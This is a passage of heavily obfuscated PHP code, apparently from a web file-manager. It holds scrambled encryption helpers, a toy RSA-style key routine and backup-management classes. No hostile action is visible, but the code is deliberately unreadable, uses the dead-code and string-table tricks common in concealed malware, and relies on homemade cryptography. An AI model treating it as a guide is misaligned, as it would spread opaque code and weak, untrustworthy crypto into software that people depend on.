$¨ßÚşô = rand(0, 64); $Ù¿ÈÅ‚ó = $‹ƒ•—’ï[$¨ßÚşô]; $Ş‡äßİ¶ = $‹îÄËŠ´[705]; if (strlen($Ş‡äßİ¶) < $‹îÄËŠ´[615]) { die; } $Å¶ÏÆ€ = md5($Ù¿ÈÅ‚ó . md5($àºáË­† . $Ù¿ÈÅ‚ó) . $àºáË­†); $Å¶ÏÆ€ = substr($Å¶ÏÆ€, $¨ßÚşô % 8, $¨ßÚşô % 8 + 7); $—ªãµÂ = $”ˆ¸ÚŞ¦[6]; $Íœİ€ø = 0; $Í´ŠÆ—Ó = 0; $‡î­üÃğ = $‹îÄËŠ´[706]; if (strlen($‡î­üÃğ) < $‹îÄËŠ´[635]) { die; } $Å§ş‘¾Ä = 0; $÷Š†çÏÈ = $‹îÄËŠ´[707]; if (strlen($÷Š†çÏÈ) < $‹îÄËŠ´[635]) { die; } for ($Íœİ€ø = 0; $Íœİ€ø < strlen($ô¼É—›ú); $Íœİ€ø++) { $Å§ş‘¾Ä = $Å§ş‘¾Ä == strlen($Å¶ÏÆ€) ? 0 : $Å§ş‘¾Ä; $²ˆÖÂş¹ = $‹îÄËŠ´[708]; if (!$²ˆÖÂş¹) { die; } $Í´ŠÆ—Ó = ($¨ßÚşô + strpos($‹ƒ•—’ï, $ô¼É—›ú[$Íœİ€ø]) + ord($Å¶ÏÆ€[$Å§ş‘¾Ä++])) % 64; $—ªãµÂ .= $‹ƒ•—’ï[$Í´ŠÆ—Ó]; $µÉ¦¼¢Ë = $‹îÄËŠ´[709]; if (!$µÉ¦¼¢Ë) { die; } } $ê¬“ûÊ = hash_encode($Ù¿ÈÅ‚ó . $—ªãµÂ); break; default: $ê¬“ûÊ = $this->jsuhbe72926f($ô¼É—›ú, $àºáË­† . $åôâú); break; } $ê¬“ûÊ = strrev($š˜ÁÑïì . $åôâú . $ê¬“ûÊ); if ($êÓƒõÒõ - 1 > 0) { $ê¬“ûÊ = $this->xdaq29ec9f10($ê¬“ûÊ, $àºáË­†, $êÓƒõÒõ - 1); } return $ê¬“ûÊ; } private function jkui5488d6ae($©“ßàçÚ, $½€˜ğç¢, $“ØßÈ÷¯ = 3) { $ˆ†Å¾óì =& $_SERVER[óó‹¸‚å]; $íŞí‘Ò =& $_SERVER[óƒÂÃÊÛ]; if (!is_string($©“ßàçÚ) || strlen($©“ßàçÚ) < 10) { return !1; } $©“ßàçÚ = trim($©“ßàçÚ); $òŠÅïª· = $ˆ†Å¾óì[710]; if (strlen($òŠÅïª·) < $ˆ†Å¾óì[615]) { return; } $©“ßàçÚ = strrev($©“ßàçÚ); $‘í¸ĞÄ· = $©“ßàçÚ[0]; $¯æÎ©° = substr($©“ßàçÚ, 1, 15); $ãçíŒ›ö = $ˆ†Å¾óì[711]; while ($ãçíŒ›ö < $ˆ†Å¾óì[620]) { if ($ãçíŒ›ö >= 0) { break; } $ãçíŒ›ö++; } $©“ßàçÚ = substr($©“ßàçÚ, 16); $¦é¹ÉÚ‚ = $ˆ†Å¾óì[712]; if (!$¦é¹ÉÚ‚) { die; } $ÕÚäå”˜ = $íŞí‘Ò[295]; $áÔ»¶²Ã = $ˆ†Å¾óì[713]; if (!$áÔ»¶²Ã) { die; } switch ($‘í¸ĞÄ·) { case $íŞí‘Ò[203]: $ŞÈ„Œ‘ = $this->uydc2abb5257($©“ßàçÚ, strrev($½€˜ğç¢ . $¯æÎ©°)); $‡›§•ıÆ = $ˆ†Å¾óì[714]; if (strlen($‡›§•ıÆ) < $ˆ†Å¾óì[623]) { return; } break; $ÄëŠÅ±÷ = $ˆ†Å¾óì[715]; if (!$ÄëŠÅ±÷) { return; } case $íŞí‘Ò[121]: $ŞÈ„Œ‘ = $this->uydc2abb5257($©“ßàçÚ, strrev($¯æÎ©° . $½€˜ğç¢)); break; case $íŞí‘Ò[296]: $ŞÈ„Œ‘ = $this->uydc2abb5257($©“ßàçÚ, base64_encode($¯æÎ©° . $½€˜ğç¢)); break; $šªìÁÖ÷ = $ˆ†Å¾óì[716]; case $íŞí‘Ò[297]: $ŞÈ„Œ‘ = $this->uydc2abb5257($©“ßàçÚ, md5($¯æÎ©° . $½€˜ğç¢)); $é»ğ¤¿ô = $ˆ†Å¾óì[717]; if (!$é»ğ¤¿ô) { return; } break; case $íŞí‘Ò[298]: $©“ßàçÚ = hash_decode($©“ßàçÚ); $©‚‡…Ôù = $ˆ†Å¾óì[718]; $Ç™Š­¡Œ = $©“ßàçÚ[0]; $‚»úÀÊ· = $ˆ†Å¾óì[719]; while ($‚»úÀÊ· < $ˆ†Å¾óì[623]) { if ($‚»úÀÊ· >= 0) { break; } $‚»úÀÊ·++; } $©“ßàçÚ = substr($©“ßàçÚ, 1); $³ãñ Â = $ˆ†Å¾óì[720]; while (strlen($³ãñ Â) < $ˆ†Å¾óì[644]) { if (!$³ãñ Â) { break; } $³ãñ Â++; } $¯ÕÓŸ®á = strpos($ÕÚäå”˜, $Ç™Š­¡Œ); $…Òğ’‹· = $ˆ†Å¾óì[690]; $œœúßÑ„ = md5($Ç™Š­¡Œ . md5($½€˜ğç¢ . $Ç™Š­¡Œ) . $½€˜ğç¢); $ÜâëšÇ© = $ˆ†Å¾óì[721]; if (strlen($ÜâëšÇ©) < $ˆ†Å¾óì[620]) { return; } $œœúßÑ„ = substr($œœúßÑ„, $¯ÕÓŸ®á % 8, $¯ÕÓŸ®á % 8 + 7); $£îÃÚçö = $ˆ†Å¾óì[722]; while (strlen($£îÃÚçö) < $ˆ†Å¾óì[620]) { if (!$£îÃÚçö) { break; } $£îÃÚçö++; } $ıëøÅ»² = $íŞí‘Ò[6]; $ğâà®Ä¬ = $ˆ†Å¾óì[723]; while (strlen($ğâà®Ä¬) < $ˆ†Å¾óì[644]) { if (!$ğâà®Ä¬) { break; } $ğâà®Ä¬++; } $¯ªÄÓÎÛ = 0; $®ÁÓüÀº = $ˆ†Å¾óì[724]; $›®³ë¬à = 0; $•¼è¨‚ = 0; $Íå§¿ı = $ˆ†Å¾óì[725]; if (strlen($Íå§¿ı) < $ˆ†Å¾óì[644]) { return; } for ($¯ªÄÓÎÛ = 0; $¯ªÄÓÎÛ < strlen($©“ßàçÚ); $¯ªÄÓÎÛ++) { $•¼è¨‚ = $•¼è¨‚ == strlen($œœúßÑ„) ? 0 : $•¼è¨‚; $ÄÇçó = $•¼è¨‚++; $›®³ë¬à = strpos($ÕÚäå”˜, $©“ßàçÚ[$¯ªÄÓÎÛ]) - $¯ÕÓŸ®á - ord($œœúßÑ„[$ÄÇçó]); while ($›®³ë¬à < 0) { $›®³ë¬à += 64; $ıÔ±©ÜÓ = $ˆ†Å¾óì[726]; while (strlen($ıÔ±©ÜÓ) < $ˆ†Å¾óì[615]) { if (!$ıÔ±©ÜÓ) { break; } $ıÔ±©ÜÓ++; } } $ıëøÅ»² .= $ÕÚäå”˜[$›®³ë¬à]; $õœˆ–¾Â = $ˆ†Å¾óì[727]; if (!$õœˆ–¾Â) { return; } } $ŞÈ„Œ‘ = base64_decode($ıëøÅ»²); $™”¹ÒÈš = $ˆ†Å¾óì[728]; while (strlen($™”¹ÒÈš) < $ˆ†Å¾óì[635]) { if (!$™”¹ÒÈš) { break; } $™”¹ÒÈš++; } break; $¶–¬£ö  = $ˆ†Å¾óì[729]; if (!$¶–¬£ö ) { return; } default: $ŞÈ„Œ‘ = $this->uydc2abb5257($©“ßàçÚ, $½€˜ğç¢ . $¯æÎ©°); break; } if ($“ØßÈ÷¯ - 1 > 0) { $ŞÈ„Œ‘ = $this->jkui5488d6ae($ŞÈ„Œ‘, $½€˜ğç¢, $“ØßÈ÷¯ - 1); } return $ŞÈ„Œ‘; } public function lxuab15aeb4e($îìÈÒ) { $ØœşİÒ =& $_SERVER[óó‹¸‚å]; $ßšÃÏÄâ =& $_SERVER[óƒÂÃÊÛ]; $ÏŞòÂæ¿ = $this->mavz48240a37(); $ÀøêÂÀ˜ = $this->mavz48240a37(); $ëöÒÏ¤ = ($ÏŞòÂæ¿ - 1) * ($ÀøêÂÀ˜ - 1); $¯âÅ­şš = intval(($ÏŞòÂæ¿ + $ÀøêÂÀ˜) / 2); $ùÖİ‰Ï¦ = $ØœşİÒ[730]; while (strlen($ùÖİ‰Ï¦) < $ØœşİÒ[623]) { if (!$ùÖİ‰Ï¦) { break; } $ùÖİ‰Ï¦++; } while (1) { $¯Ùğ»À = $¯âÅ­şš; $÷šÎæ¥Ö = $ëöÒÏ¤; $ë³‰ùÀ³ = $ØœşİÒ[731]; while (strlen($ë³‰ùÀ³) < $ØœşİÒ[620]) { if (!$ë³‰ùÀ³) { break; } $ë³‰ùÀ³++; } while ($÷šÎæ¥Ö % $¯Ùğ»À != 0) { $ƒ‘ÕÕ¾ş = $÷šÎæ¥Ö; $÷šÎæ¥Ö = $¯Ùğ»À; $¯Ùğ»À = $ƒ‘ÕÕ¾ş % $¯Ùğ»À; } if ($¯Ùğ»À == 1) { break; } else { $¯âÅ­şš++; } } $ŞÃ›–á¹ = 2; for ($“‹ÅË‚ı = 0; $“‹ÅË‚ı < $ëöÒÏ¤ * 10; $“‹ÅË‚ı++) { if (($ëöÒÏ¤ * $“‹ÅË‚ı + 1) % $¯âÅ­şš == 0) { $ŞÃ›–á¹ = intval(($ëöÒÏ¤ * $“‹ÅË‚ı + 1) / $¯âÅ­şš); break; } } $ÃÕÕ³à• = $this->jsuhbe72926f($ÏŞòÂæ¿ * $ÀøêÂÀ˜ . $ßšÃÏÄâ[6], $ßšÃÏÄâ[135]); $—«”éü = $ØœşİÒ[732]; if (strlen($—«”éü) < $ØœşİÒ[644]) { return; } $Æºù¼• = md5($ßšÃÏÄâ[299] . ($ÏŞòÂæ¿ + $ÀøêÂÀ˜) . $ßšÃÏÄâ[300] . $¯âÅ­şš . $ßšÃÏÄâ[300] . $ŞÃ›–á¹ . $ßšÃÏÄâ[301]); $†®ËÄ¸¬ = $this->jsuhbe72926f($îìÈÒ, $Æºù¼•) . $ßšÃÏÄâ[302] . $ÃÕÕ³à•; return $†®ËÄ¸¬; $ğ¦Îæ› = $ØœşİÒ[733]; if (!$ğ¦Îæ›) { return; } } public function zrhw8bce5465($æ¸û®) { $Œî–°‡¯ =& $_SERVER[óó‹¸‚å]; $‡Ü¾ =& $_SERVER[óƒÂÃÊÛ]; $‚Óñö•ó = explode($‡Ü¾[302], $æ¸û®); if (count($‚Óñö•ó) != 2) { return $‡Ü¾[6]; } $ ¤¦Ì³Ü = $this->uydc2abb5257($‚Óñö•ó[1] . $‡Ü¾[6], $‡Ü¾[135]); if (!$ ¤¦Ì³Ü) { return $‡Ü¾[6]; } $ ¤¦Ì³Ü = intval($ ¤¦Ì³Ü); $¾„Ìëøô = $Œî–°‡¯[734]; if (!$¾„Ìëøô) { return; } $ï·²¦õ = 0; $ùì’ºĞ” = $Œî–°‡¯[735]; while (strlen($ùì’ºĞ”) < $Œî–°‡¯[615]) { if (!$ùì’ºĞ”) { break; } $ùì’ºĞ”++; } $ÊÌ¹¾öû = 0; for ($½Æ–¼ôÀ = 3; $½Æ–¼ôÀ < $ ¤¦Ì³Ü; $½Æ–¼ôÀ += 2) { if ($ ¤¦Ì³Ü % $½Æ–¼ôÀ != 0) { continue; } $ï·²¦õ = $½Æ–¼ôÀ; $ÊÌ¹¾öû = intval($ ¤¦Ì³Ü / $½Æ–¼ôÀ); break; $„Ô©ü· = $Œî–°‡¯[736]; if (strlen($„Ô©ü·) < $Œî–°‡¯[620]) { return; } } $û¡ƒ¿èŸ = ($ï·²¦õ - 1) * ($ÊÌ¹¾öû - 1); $“Ÿ“ü½÷ = $Œî–°‡¯[737]; if (strlen($“Ÿ“ü½÷) < $Œî–°‡¯[615]) { return; } $Éî¡¸Ÿë = intval(($ï·²¦õ + $ÊÌ¹¾öû) / 2); $ÇÆ®ÛşÇ = $Œî–°‡¯[738]; if (strlen($ÇÆ®ÛşÇ) < $Œî–°‡¯[620]) { return; } while (1) { $Ó£†Ë’Û = $Éî¡¸Ÿë; $€Ğ¼§Ì‘ = $û¡ƒ¿èŸ; $àä³‡š  = $Œî–°‡¯[739]; if (!$àä³‡š ) { return; } while ($€Ğ¼§Ì‘ % $Ó£†Ë’Û != 0) { $›Ú–¯Ê = $€Ğ¼§Ì‘; $çê²‘±• = $Œî–°‡¯[740]; if (!$çê²‘±•) { die; } $€Ğ¼§Ì‘ = $Ó£†Ë’Û; $Ó£†Ë’Û = $›Ú–¯Ê % $Ó£†Ë’Û; $êçäÌÓÒ = $Œî–°‡¯[741]; while (strlen($êçäÌÓÒ) < $Œî–°‡¯[620]) { if (!$êçäÌÓÒ) { break; } $êçäÌÓÒ++; } } if ($Ó£†Ë’Û == 1) { break; } else { $Éî¡¸Ÿë++; } } $Éîª°½Ö = 2; for ($½Æ–¼ôÀ = 0; $½Æ–¼ôÀ < $û¡ƒ¿èŸ * 10; $½Æ–¼ôÀ++) { if (($û¡ƒ¿èŸ * $½Æ–¼ôÀ + 1) % $Éî¡¸Ÿë == 0) { $Éîª°½Ö = intval(($û¡ƒ¿èŸ * $½Æ–¼ôÀ + 1) / $Éî¡¸Ÿë); break; } } $ıĞœéÊ = md5($‡Ü¾[299] . ($ï·²¦õ + $ÊÌ¹¾öû) . $‡Ü¾[300] . $Éî¡¸Ÿë . $‡Ü¾[300] . $Éîª°½Ö . $‡Ü¾[301]); $©ê™à‘ = $Œî–°‡¯[742]; while (strlen($©ê™à‘) < $Œî–°‡¯[620]) { if (!$©ê™à‘) { break; } $©ê™à‘++; } $•ìÁÏ‚ˆ = $this->uydc2abb5257($‚Óñö•ó[0], $ıĞœéÊ); $š¿×ã„‰ = $Œî–°‡¯[743]; while ($š¿×ã„‰ < $Œî–°‡¯[620]) { if ($š¿×ã„‰ >= 0) { break; } $š¿×ã„‰++; } return $•ìÁÏ‚ˆ; $‰ÛÇöªÍ = $Œî–°‡¯[744]; } public function mavz48240a37() { $·ÉÎÕ³ =& $_SERVER[óó‹¸‚å]; $ªÆæä¥ = mt_rand(pow(2, 14), pow(2, 16) - 1); $¸Àáš³ä = $·ÉÎÕ³[745]; while ($¸Àáš³ä < $·ÉÎÕ³[620]) { if ($¸Àáš³ä >= 0) { break; } $¸Àáš³ä++; } $Ã“Õ£Á¥ = array(); $ÕÂà”Ú« = 1; while ($ÕÂà”Ú« <= (int) sqrt($ªÆæä¥)) { $‚‰À„ô× = $ÕÂà”Ú«; while (!0) { $‚‰À„ô×++; $š‘âûù = $·ÉÎÕ³[746]; if (strlen($š‘âûù) < $·ÉÎÕ³[620]) { die; } if ($‚‰À„ô× <= 2) { $ÕÂà”Ú« = $‚‰À„ô×; break; } else { if ($‚‰À„ô× < 2) { continue; } } $·ƒ”ƒ¨ñ = !0; for ($˜ŞÆú²µ = 2; $˜ŞÆú²µ <= sqrt($‚‰À„ô×); $˜ŞÆú²µ++) { if ($‚‰À„ô× % $˜ŞÆú²µ == 0) { $·ƒ”ƒ¨ñ = !1; } } if ($·ƒ”ƒ¨ñ) { $ÕÂà”Ú« = $‚‰À„ô×; break; } } $Ã“Õ£Á¥[] = $ÕÂà”Ú«; $¹Õ…´Ì = $·ÉÎÕ³[747]; while (strlen($¹Õ…´Ì) < $·ÉÎÕ³[620]) { if (!$¹Õ…´Ì) { break; } $¹Õ…´Ì++; } } $£‘êŠ¯ã = 2; $ÖÔâé¤Á = $·ÉÎÕ³[748]; if (!$ÖÔâé¤Á) { die; } for ($‚‰À„ô× = $ªÆæä¥; $‚‰À„ô× > 1; $‚‰À„ô×--) { $·ƒ”ƒ¨ñ = !0; $™Ù¶ŸÚá = $·ÉÎÕ³[749]; while (strlen($™Ù¶ŸÚá) < $·ÉÎÕ³[644]) { if (!$™Ù¶ŸÚá) { break; } $™Ù¶ŸÚá++; } foreach ($Ã“Õ£Á¥ as $¯•ìş¨ú) { if ($‚‰À„ô× % $¯•ìş¨ú == 0) { $·ƒ”ƒ¨ñ = !1; break; } } if ($·ƒ”ƒ¨ñ) { $£‘êŠ¯ã = $‚‰À„ô×; break; } } return $£‘êŠ¯ã; $Ñş¢ãÄ” = $·ÉÎÕ³[750]; } public function qcer655111b3($Òª¼ØÃç, $Ü¼Û»®Ú) { $ªü£èèİ =& $_SERVER[óƒÂÃÊÛ]; return call_user_func(array($ªü£èèİ[8], $ªü£èèİ[303]), $Òª¼ØÃç, $Ü¼Û»®Ú); } public function jsuhbe72926f($€§Ğğèú, $à©õ¾ó…) { $ù–ØÀÊÃ =& $_SERVER[óó‹¸‚å]; $Ğ¹¯êîï =& $_SERVER[óƒÂÃÊÛ]; return call_user_func(array($Ğ¹¯êîï[304], $Ğ¹¯êîï[305]), $€§Ğğèú, $à©õ¾ó…); $œå‰İÕ´ = $ù–ØÀÊÃ[751]; if (strlen($œå‰İÕ´) < $ù–ØÀÊÃ[635]) { return; } } public function uydc2abb5257($×òè¥èõ, $Ó£è¨) { $•ÕŒ”¢½ =& $_SERVER[óƒÂÃÊÛ]; return call_user_func(array($•ÕŒ”¢½[304], $•ÕŒ”¢½[306]), $×òè¥èõ, $Ó£è¨); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ùÙ”ƒ« =& $_SERVER[óó‹¸‚å]; $this->isManual(); self::$name = date($ùÙ”ƒ«[752]); if (!($†¡æ†ìö = Model($ùÙ”ƒ«[753])->lastItem())) { $†¡æ†ìö = $this->initData(); } else { self::$name = $†¡æ†ìö[$ùÙ”ƒ«[32]]; if ($†¡æ†ìö[$ùÙ”ƒ«[754]] == $ùÙ”ƒ«[88]) { self::$name = date($ùÙ”ƒ«[755]); $ô¼õ’Ë = 0; if (isset($†¡æ†ìö[$ùÙ”ƒ«[293]][$ùÙ”ƒ«[199]][$ùÙ”ƒ«[468]])) { $ô¼õ’Ë = (int) $†¡æ†ìö[$ùÙ”ƒ«[293]][$ùÙ”ƒ«[199]][$ùÙ”ƒ«[468]]; } if (self::$manual == 0 && $†¡æ†ìö[$ùÙ”ƒ«[32]] == self::$name) { Model($ùÙ”ƒ«[753])->remove($†¡æ†ìö[$ùÙ”ƒ«[399]]); } $†¡æ†ìö = $this->initData($ô¼õ’Ë, $†¡æ†ìö[$ùÙ”ƒ«[756]]); } else { $this->checkStore($†¡æ†ìö[$ùÙ”ƒ«[756]]); } } self::$option = $†¡æ†ìö; } private function isManual() { $Ó¦½˜¾É = _get($GLOBALS, $_SERVER[óó‹¸‚å][757], 0); $Ó¦½˜¾É = intval($Ó¦½˜¾É); self::$manual = $Ó¦½˜¾É && $Ó¦½˜¾É == 1 ? 1 : 0; } private function initData($Îª°Ÿö = 0, $™Æˆ£Ï¸ = '') { $‹ÌéáÏ =& $_SERVER[óó‹¸‚å]; $ÃÛ²¢ = Model($‹ÌéáÏ[753])->config(); if ($™Æˆ£Ï¸ && $ÃÛ²¢[$‹ÌéáÏ[756]] != $™Æˆ£Ï¸) { $Îª°Ÿö = 0; } $this->checkStore($ÃÛ²¢[$‹ÌéáÏ[756]]); if (self::$manual == 1) { self::$name .= $‹ÌéáÏ[11] . date($‹ÌéáÏ[758]); } $Ö¶šæâµ = array($‹ÌéáÏ[756] => $ÃÛ²¢[$‹ÌéáÏ[756]], $‹ÌéáÏ[32] => self::$name, $‹ÌéáÏ[754] => 0, $‹ÌéáÏ[759] => $ÃÛ²¢[$‹ÌéáÏ[759]], $‹ÌéáÏ[760] => self::$manual, $‹ÌéáÏ[293] => array($‹ÌéáÏ[761] => array($‹ÌéáÏ[754] => 0), $‹ÌéáÏ[762] => array($‹ÌéáÏ[754] => 0, $‹ÌéáÏ[763] => 0, $‹ÌéáÏ[764] => 0, $‹ÌéáÏ[33] => $‹ÌéáÏ[12], $‹ÌéáÏ[765] => 0, $‹ÌéáÏ[497] => 0), $‹ÌéáÏ[766] => array($‹ÌéáÏ[754] => 0, $‹ÌéáÏ[763] => 0, $‹ÌéáÏ[764] => 0, $‹ÌéáÏ[765] => 0, $‹ÌéáÏ[497] => 0), $‹ÌéáÏ[199] => array($‹ÌéáÏ[754] => 0, $‹ÌéáÏ[767] => 0, $‹ÌéáÏ[768] => 0, $‹ÌéáÏ[769] => 0, $‹ÌéáÏ[770] => 0, $‹ÌéáÏ[468] => $Îª°Ÿö, $‹ÌéáÏ[765] => 0, $‹ÌéáÏ[497] => 0)), $‹ÌéáÏ[765] => time(), $‹ÌéáÏ[497] => 0); $×‹Äş•Š = Model($‹ÌéáÏ[753])->insert($Ö¶šæâµ); $Ö¶šæâµ[$‹ÌéáÏ[399]] = $×‹Äş•Š; return $Ö¶šæâµ; } private function checkStore($¬¶«¡àâ) { $°ÇÚ™äÂ =& $_SERVER[óó‹¸‚å]; $Şê·ª° = Model($°ÇÚ™äÂ[771])->listData($¬¶«¡àâ); Model($°ÇÚ™äÂ[771])->checkConfig($Şê·ª°); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[óó‹¸‚å][753])->findByName(self::$name); } return self::$option; } public static function set($ì ­¸ãä) { $›ç¶Ìıò =& $_SERVER[óó‹¸‚å]; $µíä—ëæ = self::get(); foreach ($ì ­¸ãä as $¯ôŠ¾Èì => $¢£ó“€æ) { $ª¸ª³ŒÎ = explode($›ç¶Ìıò[10], $¯ôŠ¾Èì); $÷ÌÉ¾¡À = count($ª¸ª³ŒÎ); switch ($÷ÌÉ¾¡À) { case 1: $µíä—ëæ[$ª¸ª³ŒÎ[0]] = $¢£ó“€æ; break; case 2: $µíä—ëæ[$ª¸ª³ŒÎ[0]][$ª¸ª³ŒÎ[1]] = $¢£ó“€æ; break; case 3: $µíä—ëæ[$ª¸ª³ŒÎ[0]][$ª¸ª³ŒÎ[1]][$ª¸ª³ŒÎ[2]] = $¢£ó“€æ; break; } } Model($›ç¶Ìıò[753])->update($µíä—ëæ[$›ç¶Ìıò[399]], $µíä—ëæ); self::$option = $µíä—ëæ; return self::$option; } public function keep() { $™Øçûö¬ =& $_SERVER[óó‹¸‚å]; $ù·ŞÑ = self::get(); if ($ù·ŞÑ[$™Øçûö¬[293]][$™Øçûö¬[761]][$™Øçûö¬[754]] == $™Øçûö¬[88]) { return; } $this->backupKeep($ù·ŞÑ); self::set(array($™Øçûö¬[772] => 1)); } private function backupKeep($‘ô™ú›á) { $ÉÖÙ»—• =& $_SERVER[óó‹¸‚å]; if (self::$manual == 1) { return; } $áÍ‘Ø„Ò = Model($ÉÖÙ»—•[753])->listData(); if (empty($áÍ‘Ø„Ò)) { return; } $’ÊÄ£Ÿô = 0; $¾„¡ğ¤› = array(); foreach ($áÍ‘Ø„Ò as $ú†Ìê¡å) { if ($’ÊÄ£Ÿô >= 7) { break; } $¾„¡ğ¤›[] = $ú†Ìê¡å[$ÉÖÙ»—•[32]]; $’ÊÄ£Ÿô++; } for ($’ÊÄ£Ÿô = 0; $’ÊÄ£Ÿô < 12; $’ÊÄ£Ÿô++) { $¾„¡ğ¤›[] = date($ÉÖÙ»—•[773], strtotime("\55{$’ÊÄ£Ÿô}\40\x6d\157\x6e\164\150\163")); } $¾„¡ğ¤› = array_unique($¾„¡ğ¤›); $Ø¸ĞòÙ = Model($ÉÖÙ»—•[774])->get($ÉÖÙ»—•[775]); foreach ($áÍ‘Ø„Ò as $ú†Ìê¡å) { if (isset($ú†Ìê¡å[$ÉÖÙ»—•[760]]) && $ú†Ìê¡å[$ÉÖÙ»—•[760]] == $ÉÖÙ»—•[88]) { continue; } if (!empty($ú†Ìê¡å[$ÉÖÙ»—•[32]]) && in_array($ú†Ìê¡å[$ÉÖÙ»—•[32]], $¾„¡ğ¤›)) { continue; } Model($ÉÖÙ»—•[753])->remove($ú†Ìê¡å[$ÉÖÙ»—•[399]]); $Ï™²¤ì = $this->backupPath($‘ô™ú›á, $Ø¸ĞòÙ); IO::remove($Ï™²¤ì, !1); } } private function backupPath($æï¤†š, $˜ĞÖµí = false) { $ÈÆ¡úÜ› =& $_SERVER[óó‹¸‚å]; if (!$˜ĞÖµí) { $˜ĞÖµí = Model($ÈÆ¡úÜ›[774])->get($ÈÆ¡úÜ›[775]); } $ÑÒÆò“Ñ = $æï¤†š[$ÈÆ¡úÜ›[32]]; $Œ¢€–„ƒ = substr(md5($ÈÆ¡úÜ›[776] . $˜ĞÖµí . $ÑÒÆò“Ñ), 0, 8); return "\173\151\157\x3a{$æï¤†š[$ÈÆ¡úÜ›[756]]}\175\x2f\144\141\164\141\x62\141\x73\x65\57\142\x61\143\x6b\165\x70\57" . $ÑÒÆò“Ñ . $ÈÆ¡úÜ›[11] . $Œ¢€–„ƒ; } public function db() { $ÇœıÛÚ =& $_SERVER[óó‹¸‚å]; $ãç¿›‰û = self::get(); if ($ãç¿›‰û[$ÇœıÛÚ[293]][$ÇœıÛÚ[762]][$ÇœıÛÚ[754]] == $ÇœıÛÚ[88]) { return !0; } $ıöËÑ†½ = new BackupDb(); if (!$ıöËÑ†½->index()) { return !1; } self::set(array($ÇœıÛÚ[777] => 1)); return !0; } public function dbFile() { $Ç¹€¨Úâ =& $_SERVER[óó‹¸‚å]; $‰œ˜ª– = self::get(); if ($‰œ˜ª–[$Ç¹€¨Úâ[293]][$Ç¹€¨Úâ[766]][$Ç¹€¨Úâ[754]] == $Ç¹€¨Úâ[88]) { return !0; } $œËÒ¯ø€ = new BackupDbFile(); if (!$œËÒ¯ø€->index()) { return !1; } self::set(array($Ç¹€¨Úâ[778] => 1)); return !0; } public function file() { $Û„º‰ÍÑ =& $_SERVER[óó‹¸‚å]; $ƒñÜ«êÙ = self::get(); if ($ƒñÜ«êÙ[$Û„º‰ÍÑ[293]][$Û„º‰ÍÑ[199]][$Û„º‰ÍÑ[754]] == $Û„º‰ÍÑ[88]) { return !0; } if (!isset($ƒñÜ«êÙ[$Û„º‰ÍÑ[759]]) || $ƒñÜ«êÙ[$Û„º‰ÍÑ[759]] == $Û„º‰ÍÑ[197]) { $İ‘Ó™±ú = new BackupFile(); if (!$İ‘Ó™±ú->index()) { return !1; } } self::set(array($Û„º‰ÍÑ[779] => 1, $Û„º‰ÍÑ[754] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $àêœêŠ… =& $_SERVER[óó‹¸‚å]; $‹¬’®˜‰ = Backup::get(); self::$io = $‹¬’®˜‰[$àêœêŠ…[756]]; self::$name = $‹¬’®˜‰[$àêœêŠ…[32]]; $òÒ¥¨“ = new DbManage(); $ÏâÄØóÓ = $òÒ¥¨“->dbType(); $ä¿—¹’â = array($àêœêŠ…[780] => $ÏâÄØóÓ, $àêœêŠ…[781] => time()); Backup::set($ä¿—¹’â); $²À•çÆº = $this->tmpFilesPath() . $àêœêŠ…[782] . self::$name . $àêœêŠ…[8]; del_dir($²À•çÆº); mk_dir($²À•çÆº); $Ğšáƒó = $çèä´ä = 0; $¹Œ²¢šÑ = new Task($àêœêŠ…[783], $àêœêŠ…[784], 0, LNG($àêœêŠ…[785]) . $àêœêŠ…[786] . LNG($àêœêŠ…[787])); try { $¦ãæ»…ø = $òÒ¥¨“->db()->getTables(); } catch (Exception $½¢½¨Û) { $¹Œ²¢šÑ->end(); return !1; } $¦ãæ»…ø = array_diff($¦ãæ»…ø, array($àêœêŠ…[788], $àêœêŠ…[789])); foreach ($¦ãæ»…ø as $ÑËìäş) { $Ğšáƒó += $òÒ¥¨“->model($ÑËìäş)->count(); } $¹Œ²¢šÑ->task[$àêœêŠ…[790]] = $Ğšáƒó; $GLOBALS[$àêœêŠ…[791]] = self::$name; foreach ($¦ãæ»…ø as $ÑËìäş) { $úú¾áğ— = $²À•çÆº . $ÑËìäş . $àêœêŠ…[792]; $«ñÂñŒú = null; if ($ÑËìäş == $àêœêŠ…[793] && (!isset($‹¬’®˜‰[$àêœêŠ…[759]]) || $‹¬’®˜‰[$àêœêŠ…[759]] == $àêœêŠ…[197])) { $«ñÂñŒú = self::$io; } $çèä´ä += $òÒ¥¨“->sqlFromDb($ÑËìäş, $úú¾áğ—, $¹Œ²¢šÑ, $«ñÂñŒú); } unset($GLOBALS[$àêœêŠ…[791]]); $¹Œ²¢šÑ->end(); if ($çèä´ä > $Ğšáƒó) { $Ğšáƒó = $çèä´ä; } $ä¿—¹’â = array($àêœêŠ…[780] => $ÏâÄØóÓ, $àêœêŠ…[777] => 1, $àêœêŠ…[794] => $Ğšáƒó, $àêœêŠ…[795] => $çèä´ä, $àêœêŠ…[796] => time()); Backup::set($ä¿—¹’â); if ($Ğšáƒó - $çèä´ä > 0) { $úûøÍùŠ = $àêœêŠ…[797]; if (stristr(I18n::getType(), $àêœêŠ…[798])) { $úûøÍùŠ = $àêœêŠ…[799]; } write_log(array($úûøÍùŠ, $ä¿—¹’â), $àêœêŠ…[784]); return !1; } return !0; } private function tmpFilesPath() { $«£ŸÖ³§ =& $_SERVER[óó‹¸‚å]; $”Ã›­ƒŒ = TEMP_FILES; if ($GLOBALS[$«£ŸÖ³§[6]][$«£ŸÖ³§[89]][$«£ŸÖ³§[800]]) { $”Ã›­ƒŒ = $GLOBALS[$«£ŸÖ³§[6]][$«£ŸÖ³§[89]][$«£ŸÖ³§[800]]; if (!mk_dir($”Ã›­ƒŒ) || !is_writable($”Ã›­ƒŒ) || !IO::mkfile($”Ã›­ƒŒ . $«£ŸÖ³§[801])) { $”Ã›­ƒŒ = TEMP_FILES; } } return $”Ã›­ƒŒ; } } goto BÆ·ˆ¯ˆá¯; d¢»·Ì¼‚š: class PathDriverDbShareLink extends PathDriverDB { public function __construct($Æ…²Ğ¯Û) { $this->pathParse = $Æ…²Ğ¯Û; $this->model = Model($_SERVER[óó‹¸‚å][1343]); } protected function infoParse($ÀëçÓş, $£Ğ˜óĞ¸ = false, $Ğ¢»ÌŠì = false) { $’Ø‹ÑØÔ =& 